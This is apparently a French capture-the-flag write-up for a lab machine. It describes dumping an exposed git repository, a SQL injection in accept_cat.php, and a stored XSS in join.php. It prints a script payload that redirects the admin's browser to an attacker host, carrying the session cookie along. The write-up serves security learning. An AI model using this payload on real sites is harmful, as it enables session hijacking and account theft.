## Enumération

- **IP**: 
```
10.10.11.53
```

- **nmap**
![[Pasted image 20250330202108.png]]On voit qu'il y a un **repository git** dans l'url `10.10.11.53:80/.git/` donc nous allons le télécharger avec **gitdumper**.
Voici tout ce qu'on a eu
![[Pasted image 20250330211324.png]]
Dans le fichier **accept_cat.php**, nous pouvons trouver une **vumnérabilité SQLi**:
![[Pasted image 20250330211649.png]]
L'application prend le paramètre **CatName** et l'utilise dans une requête SQL sans **désinfection** appropriée, la rendant vulnérable à l'injection SQL.
Mais Après une inspection plus approfondie du code, j'ai remarqué que pour exploiter cette vulnérabilité, nous aurions besoin du cookie d'Axel, car l'application vérifie la session de l'utilisateur.

J'ai également découvert une **vulnérabilité XSS** dans join.php. L'application accepte les entrées par e-mail et nom d'utilisateur et les enregistre sans **désinfection** appropriée. En conséquence, si le nom d'utilisateur contient une charge utile XSS, cela pourrait potentiellement affecter l'administrateur lorsqu'il affiche l'entrée.
![[Pasted image 20250330212239.png]]

Le but est donc de recuperer la **session  de Axel** pour pouvoir exploiter la vulnérabilité **SQLi**.  Pour cela, nous devons exploiter la vulnérabilité **XSS** que nous avons découvert. 
Nous allons utiliser le **payloads** suivant dans le champ de saisi **username**:

```
<script>document.location='http://10.10.x.y:9082/?c='+document.cookie;</script>
```

Après ça, on doit être connecter. Nous allons uploader une image dans l'espoir que si l'admin le voit, notre **payload XSS** s'éxécute.

![[Pasted image 20250330213249.png]]